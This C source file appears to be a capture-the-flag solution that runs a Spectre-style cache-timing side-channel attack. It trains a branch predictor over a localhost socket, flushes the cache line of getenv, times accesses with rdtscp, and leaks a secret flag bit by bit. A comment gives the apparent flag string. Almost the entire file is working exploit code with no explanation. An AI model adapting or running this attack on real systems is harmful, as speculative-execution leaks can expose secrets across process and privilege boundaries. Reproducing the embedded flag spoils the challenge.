// https://github.com/crozone/SpectrePoC/blob/master/spectre.c

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <x86intrin.h>

#define BASE_ADDR 0x400000

static int create_client(void) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  assert(fd >= 0);
  struct sockaddr_in sa;
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  int ret = inet_aton("127.0.0.1", &sa.sin_addr);
  assert(ret == 1);
  sa.sin_port = htons(8080);
  ret = connect(fd, (const struct sockaddr *)&sa, sizeof(sa));
  assert(ret == 0);
  return fd;
}

static inline void write_n(int fd, const void *buf, size_t n) {
  while (n) {
    ssize_t n_written = write(fd, buf, n);
    assert(n_written > 0);
    buf += n_written;
    n -= n_written;
  }
}

static int impl(void) {
  cpu_set_t aff;
  CPU_ZERO(&aff);
  CPU_SET(1, &aff);
  int ret = sched_setaffinity(0, sizeof(cpu_set_t), &aff);
  assert(ret == 0);

  int training[100];
  for (size_t i = 0; i < sizeof(training) / sizeof(training[0]); i++) {
    // TAKEN: if ((x >> 3) < limit)
    // NOT TAKEN: if (flag[x >> 3] & (x << (i & 7)))
    training[i] = 7;
  }

  int fd = create_client();
  char flag[64];
  memset(flag, 0, sizeof(flag));
  for (int i = 0; i < (int)(sizeof(flag) * 8); i++) {
    unsigned long dts[30];
    for (size_t j = 0; j < sizeof(dts) / sizeof(dts[0]); j++) {
      write_n(fd, &training, sizeof(training));
      for (volatile int k = 0; k < 100000; k++) {
      }
      _mm_clflush(getenv);
      for (volatile int k = 0; k < 100000; k++) {
      }
      write_n(fd, &i, sizeof(i));
      for (volatile int k = 0; k < 100000; k++) {
      }
      unsigned int aux;
      unsigned long t0 = __rdtscp(&aux);
      void *s = getenv("");
      (void)s;
      dts[j] = __rdtscp(&aux) - t0;
    }
    printf("%d:", i);
    unsigned long dt_threshold = 350;
    unsigned long count = 0;
    for (size_t j = 0; j < sizeof(dts) / sizeof(dts[0]); j++) {
      printf(" %ld", dts[j]);
      if (dts[j] < dt_threshold)
        count += 1;
    }
    if (count > (sizeof(dts) / sizeof(dts[0])) / 3)
      flag[i >> 3] |= 1 << (i & 7);
    printf("\nflag = %s\n", flag);
    // CTF-BR{eZ_PaRt_Ok}
  }

  return 0;
}

int main(int argc, char **argv) {
  char impl_flag[] = "--impl";
  if (argc == 2 && strcmp(argv[1], impl_flag) == 0)
    return impl();
  char *execve_argv[] = {argv[0], impl_flag, NULL};
  char *execve_envp[] = {NULL};
  execve(argv[0], execve_argv, execve_envp);
}